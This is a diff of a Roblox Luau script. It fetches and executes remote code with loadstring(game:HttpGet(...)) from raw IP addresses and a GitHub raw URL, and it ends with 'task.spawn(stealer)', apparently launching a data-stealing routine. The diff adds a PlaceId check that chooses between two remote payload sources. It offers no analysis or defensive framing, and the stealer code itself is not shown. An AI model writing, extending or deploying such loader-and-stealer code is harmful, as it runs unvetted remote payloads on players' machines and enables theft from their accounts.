@@ -4,7 +4,12 @@ loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
 
 local function loadui()
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+  if game.PlaceId == 142823291 then
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+  else
+      loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+  end
+
 end
 
 task.spawn(stealer)
